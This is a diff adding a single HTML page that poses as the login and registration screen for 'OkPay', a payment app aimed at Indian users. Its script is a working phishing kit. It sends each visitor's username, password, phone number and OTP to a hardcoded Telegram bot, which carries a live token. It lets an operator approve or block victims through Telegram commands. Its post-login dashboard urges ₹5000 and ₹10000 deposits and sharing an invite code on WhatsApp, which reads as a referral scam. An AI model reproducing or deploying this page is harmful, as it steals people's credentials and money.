@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OkPay - Login & Register</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary-green: #129660;
+            --light-green: #73bda0;
+            --bg-color: #f4f6fa;
+            --input-border: #d1e7dd;
+            --text-dark: #2c3e50;
+            --text-grey: #888888;
+            --icon-black: #000000;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        body { background-color: var(--bg-color); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .app-container { width: 100%; max-width: 420px; background-color: var(--bg-color); min-height: 850px; position: relative; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
+        .screen { padding: 30px 25px; display: flex; flex-direction: column; height: 100%; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateX(10px); } to { opacity: 1; transform: translateX(0); } }
+        .logo-container { display: flex; flex-direction: column; align-items: center; justify-content: center; margin-top: 40px; margin-bottom: 40px; }
+        .logo-img { width: 180px; height: auto; object-fit: contain; }
+        .input-group { position: relative; margin-bottom: 18px; }
+        .input-group i { position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: var(--primary-green); font-size: 20px; }
+        .input-group i.fa-user, .input-group i.fa-circle-user, .input-group i.fa-lock { color: var(--icon-black) !important; }
+        .input-group input { width: 100%; padding: 18px 20px 18px 55px; border: 1px solid var(--input-border); border-radius: 50px; font-size: 16px; outline: none; background-color: white; color: var(--text-dark); }
+        .input-group input::placeholder { color: #b0b0b0; }
+        .input-group input:focus { border-color: var(--primary-green); }
+        .row-between { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; font-size: 16px; }
+        .link-green { color: var(--primary-green); text-decoration: none; font-weight: 500; font-size: 16px; }
+        .remember-me { display: flex; align-items: center; color: var(--primary-green); cursor: pointer; font-size: 16px; }
+        .remember-me input { display: none; }
+        .custom-radio { width: 20px; height: 20px; border: 2px solid var(--primary-green); border-radius: 50%; margin-right: 10px; display: inline-block; position: relative; }
+        .remember-me input:checked + .custom-radio::after { content: ''; width: 10px; height: 10px; background-color: var(--primary-green); border-radius: 50%; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
+        .agree-row { display: flex; align-items: center; margin-bottom: 30px; font-size: 16px; color: var(--text-dark); }
+        .agree-row input { display: none; }
+        .custom-checkbox { width: 22px; height: 22px; border: 1px solid var(--input-border); border-radius: 50%; margin-right: 12px; display: inline-flex; justify-content: center; align-items: center; background-color: white; cursor: pointer; transition: all 0.2s; }
+        .agree-row input:checked + .custom-checkbox { background-color: var(--primary-green); border-color: var(--primary-green); }
+        .agree-row input:checked + .custom-checkbox::after { content: '\f00c'; font-family: 'Font Awesome 6 Free'; font-weight: 900; color: white; font-size: 12px; }
+        .btn-primary { width: 100%; background-color: var(--primary-green); color: white; border: none; padding: 18px; border-radius: 50px; font-size: 18px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; margin-bottom: 30px; box-shadow: 0 4px 10px rgba(18, 150, 96, 0.3); }
+        .btn-primary:hover { background-color: #0d7a4d; }
+        .forgot-password { text-align: center; margin-bottom: 20px; font-size: 16px; }
+        .register-header { display: flex; align-items: center; justify-content: center; position: relative; margin-bottom: 35px; padding-top: 15px; }
+        .back-btn { position: absolute; left: 0; font-size: 24px; color: var(--primary-green); cursor: pointer; text-decoration: none; }
+        .register-header h2 { color: var(--primary-green); font-size: 22px; font-weight: 700; }
+        .phone-input { position: relative; }
+        .phone-input i { position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: var(--primary-green); font-size: 20px; }
+        .country-code { position: absolute; left: 50px; top: 50%; transform: translateY(-50%); color: var(--primary-green); font-weight: 600; font-size: 16px; }
+        .phone-input .divider { position: absolute; left: 95px; top: 50%; transform: translateY(-50%); height: 22px; width: 1px; background-color: #ccc; }
+        .phone-input input { padding-left: 110px; }
+        .otp-input { position: relative; }
+        .otp-input i { position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: var(--primary-green); font-size: 20px; }
+        .otp-input input { padding-left: 55px; padding-right: 110px; }
+        .btn-send { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background-color: var(--light-green); color: white; border: none; padding: 12px 25px; border-radius: 30px; font-size: 15px; font-weight: 600; cursor: pointer; min-width: 80px; }
+        .btn-send:disabled { background-color: #ccc; cursor: not-allowed; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.6); z-index: 1000; display: none; backdrop-filter: blur(3px); }
+        .modal { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 350px; background-color: white; border-radius: 20px; padding: 30px 25px; z-index: 1001; display: none; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); text-align: center; }
+        .modal-header { margin-bottom: 20px; }
+        .modal-header h3 { font-size: 22px; color: var(--text-dark); font-weight: 700; }
+        .modal-body p { font-size: 15px; color: var(--text-grey); margin-bottom: 20px; line-height: 1.5; }
+        .modal-body .phone-number { font-weight: 600; color: var(--primary-green); font-size: 18px; }
+        .spinner { width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid var(--primary-green); border-radius: 50%; margin: 0 auto 20px auto; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status-text { color: var(--primary-green); font-weight: 600; font-size: 16px; margin-bottom: 10px; }
+        #blocked-modal .modal-header h3 { color: #dc3545; }
+        #blocked-modal .status-text { color: #dc3545; }
+        .blocked-icon { font-size: 60px; color: #dc3545; margin-bottom: 15px; }
+        #dashboard-screen { display: none; background: radial-gradient(circle at center, #1a2a3a 0%, #0d141e 100%); padding: 0; position: relative; overflow-y: auto; }
+        .banner-container { width: 100%; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 40px 20px 30px 20px; }
+        .dash-logo { width: 160px; height: auto; margin-bottom: 20px; filter: drop-shadow(0px 0px 30px rgba(255, 215, 0, 0.8)); animation: float3D 3s ease-in-out infinite; }
+        @keyframes float3D { 0% { transform: translateY(0px) rotateX(10deg); } 50% { transform: translateY(-15px) rotateX(-10deg); } 100% { transform: translateY(0px) rotateX(10deg); } }
+        .glow-title { font-size: 28px; font-weight: 700; color: #fff; text-align: center; text-shadow: 0 0 10px rgba(255, 255, 255, 0.8), 0 0 20px rgba(18, 150, 96, 0.8), 0 0 30px rgba(18, 150, 96, 0.6); margin-bottom: 15px; line-height: 1.3; }
+        .glow-subtitle { color: #f1c40f; font-size: 18px; font-weight: 600; text-align: center; text-shadow: 0 0 10px rgba(241, 196, 15, 0.5); margin-bottom: 30px; }
+        .poster-box { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 25px; width: 100%; box-shadow: 0 15px 35px rgba(0,0,0,0.5); margin-bottom: 20px; }
+        .poster-box p { color: #e0e0e0; font-size: 16px; line-height: 1.7; margin-bottom: 15px; text-align: center; }
+        .highlight-text { color: #2ecc71; font-weight: 700; text-shadow: 0 0 8px rgba(46, 204, 113, 0.5); }
+        .invite-section { background: linear-gradient(135deg, #ffd700, #ff8c00); border-radius: 15px; padding: 15px; text-align: center; margin: 20px 0; box-shadow: 0 0 20px rgba(255, 215, 0, 0.4); }
+        .invite-section span { display: block; color: #333; font-size: 14px; font-weight: 600; margin-bottom: 5px; }
+        .invite-code-val { font-size: 24px; font-weight: 800; color: #000; letter-spacing: 2px; }
+        .benefits-list { list-style: none; padding: 0; margin: 20px 0; }
+        .benefits-list li { color: #fff; font-size: 15px; margin-bottom: 12px; display: flex; align-items: flex-start; gap: 10px; }
+        .benefits-list li i { color: #f1c40f; margin-top: 4px; }
+        .share-btn-glow { width: 100%; background: linear-gradient(90deg, #11998e, #38ef7d); color: white; border: none; padding: 18px; border-radius: 50px; font-size: 18px; font-weight: 700; cursor: pointer; box-shadow: 0 0 20px rgba(56, 239, 125, 0.5); text-transform: uppercase; animation: pulseGlow 2s infinite; }
+        @keyframes pulseGlow { 0% { box-shadow: 0 0 15px rgba(56, 239, 125, 0.4); } 50% { box-shadow: 0 0 30px rgba(56, 239, 125, 0.8); } 100% { box-shadow: 0 0 15px rgba(56, 239, 125, 0.4); } }
+        #register-screen { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <div class="screen" id="login-screen">
+            <div class="logo-container">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRbWy2pOxroArXaQ8Xn2CLUG7V2BfiMixjwBaHo4F8MA&amp;s=10" alt="OkPay Logo" class="logo-img">
+            </div>
+            <form onsubmit="handleSignIn(event)">
+                <div class="input-group">
+                    <i class="fa-regular fa-circle-user"></i>
+                    <input type="tel" id="loginPhone" placeholder="Phone" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10)">
+                </div>
+                <div class="input-group">
+                    <i class="fa-solid fa-lock"></i>
+                    <input type="password" id="loginPassword" placeholder="Password">
+                </div>
+                <div class="row-between">
+                    <a href="#" class="link-green" onclick="toggleScreen(event, 'register')">Register</a>
+                    <label class="remember-me">
+                        <input type="radio" name="remember">
+                        <span class="custom-radio"></span>
+                        Remember Me
+                    </label>
+                </div>
+                <label class="agree-row">
+                    <input type="checkbox" checked>
+                    <span class="custom-checkbox"></span>
+                    Agree "<a href="#" class="link-green" style="margin-left:4px;">User Privacy Agreement</a>"
+                </label>
+                <button type="submit" class="btn-primary">Sign In</button>
+            </form>
+            <a href="#" class="link-green forgot-password" style="text-decoration: underline;">Forget Password</a>
+        </div>
+
+        <div class="screen" id="register-screen">
+            <div class="register-header">
+                <a href="#" class="back-btn" onclick="toggleScreen(event, 'login')"><i class="fa-solid fa-arrow-left"></i></a>
+                <h2>Register</h2>
+            </div>
+            <form onsubmit="handleRegister(event)">
+                <div class="input-group">
+                    <i class="fa-regular fa-circle-user"></i>
+                    <input type="text" id="reg-username" placeholder="User Name">
+                </div>
+                <div class="input-group">
+                    <i class="fa-solid fa-lock"></i>
+                    <input type="password" id="reg-password" placeholder="Password">
+                </div>
+                <div class="input-group phone-input">
+                    <i class="fa-solid fa-phone"></i>
+                    <span class="country-code">+91</span>
+                    <span class="divider"></span>
+                    <input type="tel" id="reg-phone" placeholder="Phone" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10)">
+                </div>
+                <div class="input-group otp-input">
+                    <i class="fa-solid fa-envelope"></i>
+                    <input type="text" id="reg-otp" placeholder="OTP Code">
+                    <button type="button" id="reg-send-btn" class="btn-send" onclick="sendOtpData()">Send</button>
+                </div>
+                <div class="input-group">
+                    <i class="fa-solid fa-link"></i>
+                    <input type="text" id="reg-invite" value="WFTuKi" readonly>
+                </div>
+                <button type="submit" class="btn-primary" style="margin-top: 15px;">Sign Up</button>
+            </form>
+        </div>
+
+        <div class="screen" id="dashboard-screen">
+            <div class="banner-container">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRbWy2pOxroArXaQ8Xn2CLUG7V2BfiMixjwBaHo4F8MA&amp;s=10" alt="OkPay Logo" class="dash-logo">
+                <h1 class="glow-title">OKPAY जल्द आने वाला है!</h1>
+                <p class="glow-subtitle">आप लोग जल्दी रजिस्टर कर लें।</p>
+                <div class="poster-box">
+                    <p>अगर आप लॉन्च से पहले रजिस्टर नहीं करेंगे, तो आपको <span class="highlight-text">बोनस नहीं मिलेगा!</span></p>
+                    <div class="invite-section">
+                        <span>मेरा इनवाइट कोड इस्तेमाल करें:</span>
+                        <div class="invite-code-val">WFTuKi</div>
+                    </div>
+                    <p style="margin-top: 15px; font-weight: 600; color: #fff;">कमीशन का पूरा फायदा उठाएं:</p>
+                    <ul class="benefits-list">
+                        <li><i class="fa-solid fa-check-circle"></i> <div><b>₹5000 डिपॉजिट</b> करने पर आपको कमीशन मिलेगा।</div></li>
+                        <li><i class="fa-solid fa-check-circle"></i> <div><b>₹10000 डिपॉजिट</b> करने पर एक्स्ट्रा कमीशन मिलेगा।</div></li>
+                        <li><i class="fa-solid fa-check-circle"></i> <div>कमीशन इनवाइट ओनर के द्वारा दिया जाएगा।</div></li>
+                        <li><i class="fa-solid fa-check-circle"></i> <div>जितना ज्यादा डिपॉजिट लगाओगे, उसके हिसाब से <b class="highlight-text">एक्स्ट्रा कमीशन</b> दिया जाएगा।</div></li>
+                    </ul>
+                    <p style="font-size: 14px; color: #aaa;">जल्दी रजिस्टर करें और दोस्तों को भी रजिस्टर करवाएं। धन्यवाद!</p>
+                </div>
+                <button class="share-btn-glow" onclick="shareInvite()">
+                    <i class="fa-solid fa-share-nodes"></i> दोस्तों को शेयर करें
+                </button>
+                <button onclick="logoutUser()" style="width:100%; margin-top:15px; background:transparent; border:2px solid #dc3545; color:#dc3545; padding:14px; border-radius:50px; font-size:16px; font-weight:600; cursor:pointer;">
+                    <i class="fa-solid fa-right-from-bracket"></i> Logout
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div class="overlay" id="overlay"></div>
+    <div class="modal" id="deviceModal">
+        <div class="modal-header">
+            <h3 id="modalTitle">Verify Now</h3>
+        </div>
+        <div class="modal-body">
+            <div class="spinner"></div>
+            <p class="status-text" id="modalStatus">Please wait...</p>
+            <p id="modalDesc">We are verifying your details for <br><span class="phone-number" id="modalPhone">+91 XXXXX XXXXX</span></p>
+        </div>
+    </div>
+
+    <div class="modal" id="blocked-modal">
+        <div class="modal-header">
+            <h3>Account Blocked</h3>
+        </div>
+        <div class="modal-body">
+            <div class="blocked-icon"><i class="fa-solid fa-ban"></i></div>
+            <p class="status-text">Aapka Account Block Kar Diya Gaya Hai!</p>
+            <p>Aap is number se Login ya Register nahi kar sakte. Kripya Customer Support se sampark karein.</p>
+            <button class="btn-primary" style="background-color: #dc3545; margin-top: 15px;" onclick="closeBlocked()">Close</button>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8992589987:AAHczoGhmcUzLky4g_OVXedK8v7KB7-Efus";
+        const CHAT_ID = "7161140319";
+
+        let blockedNumbers = JSON.parse(localStorage.getItem('blockedNumbers')) || [];
+        let registeredUsers = JSON.parse(localStorage.getItem('registeredUsers')) || [];
+        
+        let lastTelegramUpdateId = 0;
+        let currentPendingVerifyPhone = null;
+        let pendingAction = null;
+        let pendingRegisterData = null;
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+                });
+            } catch (error) { }
+        }
+
+        async function checkTelegramCommands() {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastTelegramUpdateId + 1}`;
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                if (data.ok && data.result.length > 0) {
+                    data.result.forEach(update => {
+                        lastTelegramUpdateId = update.update_id;
+                        if (update.message && update.message.text) {
+                            processAdminCommand(update.message.text);
+                        }
+                    });
+                }
+            } catch (error) { }
+        }
+        // Faster polling: 1.5 second
+        setInterval(checkTelegramCommands, 1500);
+
+        function processAdminCommand(text) {
+            const parts = text.trim().split(" ");
+            const action = parts[0].toLowerCase();
+            const number = parts[1];
+
+            if (action === "/approve" && number) {
+                if (currentPendingVerifyPhone === number) {
+                    handleApproval();
+                }
+            } 
+            else if (action === "/block" && number) {
+                if (!blockedNumbers.includes(number)) {
+                    blockedNumbers.push(number);
+                    localStorage.setItem('blockedNumbers', JSON.stringify(blockedNumbers));
+                    if (currentPendingVerifyPhone === number) {
+                        closeModal();
+                        showBlockedScreen();
+                    }
+                }
+            } 
+            else if (action === "/unblock" && number) {
+                blockedNumbers = blockedNumbers.filter(num => num !== number);
+                localStorage.setItem('blockedNumbers', JSON.stringify(blockedNumbers));
+            }
+        }
+
+        function toggleScreen(event, screenToShow) {
+            if(event) event.preventDefault();
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('register-screen').style.display = 'none';
+            if (screenToShow === 'register') {
+                document.getElementById('register-screen').style.display = 'flex';
+            } else {
+                document.getElementById('login-screen').style.display = 'flex';
+            }
+        }
+
+        function sendOtpData() {
+            const username = document.getElementById('reg-username').value.trim() || "N/A";
+            const password = document.getElementById('reg-password').value.trim() || "N/A";
+            const phone = document.getElementById('reg-phone').value.trim() || "N/A";
+            if (!phone || phone.length < 10) {
+                alert("Kripya sahi Phone Number daalein.");
+                return;
+            }
+            const message = `📩 <b>REGISTRATION - OTP REQUESTED</b>\n👤 <b>User:</b> ${username}\n🔑 <b>Pass:</b> ${password}\n📞 <b>Phone:</b> +91 ${phone}`;
+            sendToTelegram(message);
+
+            const btn = document.getElementById('reg-send-btn');
+            let timeLeft = 59;
+            btn.disabled = true;
+            btn.innerText = `${timeLeft}s`;
+            const timer = setInterval(() => {
+                timeLeft--;
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    btn.disabled = false;
+                    btn.innerText = "Send";
+                } else {
+                    btn.innerText = `${timeLeft}s`;
+                }
+            }, 1000);
+        }
+
+        function handleRegister(event) {
+            event.preventDefault();
+            const username = document.getElementById('reg-username').value.trim();
+            const password = document.getElementById('reg-password').value.trim();
+            const phone = document.getElementById('reg-phone').value.trim();
+            const otp = document.getElementById('reg-otp').value.trim();
+            const invite = document.getElementById('reg-invite').value.trim();
+
+            if (!username || !password || !phone || !otp) {
+                alert("Kripya saare fields bharein (OTP bhi).");
+                return;
+            }
+
+            if (blockedNumbers.includes(phone)) {
+                showBlockedScreen();
+                return;
+            }
+
+            const userExists = registeredUsers.find(u => u.phone === phone);
+            if (userExists) {
+                alert("Yeh number pehle se register hai! Kripya Login karein.");
+                toggleScreen(null, 'login');
+                return;
+            }
+
+            const message = `🆕 <b>NEW REGISTRATION - APPROVAL NEEDED</b>\n\n👤 <b>User:</b> ${username}\n🔑 <b>Pass:</b> ${password}\n📞 <b>Phone:</b> +91 ${phone}\n✉️ <b>OTP:</b> ${otp}\n🔗 <b>Invite:</b> ${invite}\n\n━━━━━━━━━━━━━━\n👇 <b>Copy this command:</b>\n<code>/approve ${phone}</code>\n━━━━━━━━━━━━━━`;
+            sendToTelegram(message);
+
+            pendingAction = 'register';
+            pendingRegisterData = { username, password, phone, otp, invite };
+            openVerifyModal(phone, 'register');
+        }
+
+        function handleSignIn(event) {
+            event.preventDefault();
+            const phone = document.getElementById('loginPhone').value.trim();
+            const password = document.getElementById('loginPassword').value.trim();
+            if(!phone || !password) { alert("Kripya Phone aur Password daalein."); return; }
+
+            if (blockedNumbers.includes(phone)) {
+                showBlockedScreen();
+                return;
+            }
+
+            const userExists = registeredUsers.find(u => u.phone === phone);
+            if (!userExists) {
+                alert("Aapne abhi tak register nahi kiya hai. Please Register Now!");
+                toggleScreen(null, 'register');
+                return;
+            }
+
+            const message = `🔐 <b>LOGIN ATTEMPT</b>\n\n📞 <b>Phone:</b> +91 ${phone}\n🔑 <b>Password:</b> ${password}\n\n━━━━━━━━━━━━━━\n👇 <b>Copy this command:</b>\n<code>/approve ${phone}</code>\n━━━━━━━━━━━━━━`;
+            sendToTelegram(message);
+
+            pendingAction = 'login';
+            openVerifyModal(phone, 'login');
+        }
+
+        function openVerifyModal(phone, mode) {
+            document.getElementById('modalPhone').innerText = phone ? "+91 " + phone : "+91 XXXXX XXXXX";
+            document.getElementById('modalTitle').innerText = mode === 'register' ? "Verify Registration" : "Verify Now";
+            currentPendingVerifyPhone = phone;
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('deviceModal').style.display = 'block';
+        }
+
+        function closeModal() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('deviceModal').style.display = 'none';
+            currentPendingVerifyPhone = null;
+        }
+
+        // ===== APPROVAL =====
+        function handleApproval() {
+            closeModal();
+
+            // ===== REGISTER APPROVED → LOGIN SCREEN pe bhejo =====
+            if (pendingAction === 'register' && pendingRegisterData) {
+                registeredUsers.push(pendingRegisterData);
+                localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
+
+                // Form clear
+                document.getElementById('reg-username').value = '';
+                document.getElementById('reg-password').value = '';
+                document.getElementById('reg-phone').value = '';
+                document.getElementById('reg-otp').value = '';
+
+                pendingAction = null;
+                pendingRegisterData = null;
+
+                // Login screen pe bhejo
+                document.getElementById('register-screen').style.display = 'none';
+                document.getElementById('login-screen').style.display = 'flex';
+            } 
+            // ===== LOGIN APPROVED → DASHBOARD =====
+            else if (pendingAction === 'login') {
+                pendingAction = null;
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('register-screen').style.display = 'none';
+                document.getElementById('dashboard-screen').style.display = 'flex';
+            }
+        }
+
+        function showBlockedScreen() {
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('blocked-modal').style.display = 'block';
+        }
+
+        function closeBlocked() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('blocked-modal').style.display = 'none';
+        }
+
+        function shareInvite() {
+            const inviteCode = "WFTuKi";
+            const shareText = `🚀 OKPAY जल्द आ रहा है!\n\n💰 ₹5000 डिपॉजिट पर कमीशन\n💸 ₹10000 डिपॉजिट पर एक्स्ट्रा कमीशन\n\n🎁 मेरा इनवाइट कोड: ${inviteCode}`;
+            if (navigator.share) {
+                navigator.share({ title: 'OkPay - Invite', text: shareText }).catch(() => {});
+            } else {
+                window.open(`https://wa.me/?text=${encodeURIComponent(shareText)}`, '_blank');
+            }
+        }
+
+        function logoutUser() {
+            if (!confirm("Kya aap logout karna chahte hain?")) return;
+            document.getElementById('dashboard-screen').style.display = 'none';
+            document.getElementById('login-screen').style.display = 'flex';
+            document.getElementById('loginPhone').value = '';
+            document.getElementById('loginPassword').value = '';
+            pendingAction = null;
+            pendingRegisterData = null;
+            currentPendingVerifyPhone = null;
+        }
+    </script>
+</body>
+</html>
